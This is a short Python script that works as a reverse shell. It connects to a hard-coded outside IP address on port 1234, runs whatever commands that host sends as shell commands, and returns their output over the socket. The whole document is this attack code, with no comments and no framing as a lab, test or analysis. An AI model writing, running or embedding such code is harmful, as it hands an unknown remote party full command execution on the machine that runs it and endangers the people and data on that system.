import socket
import os
import subprocess


sock = socket.socket()
sock.connect(("213.57.254.39", 1234))
while True:
    process=subprocess.Popen(sock.recv(1024).split(" "), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr = subprocess.PIPE)
    line = process.stdout.readline()
    while line != "":
        sock.send(line)
        line = process.stdout.readline()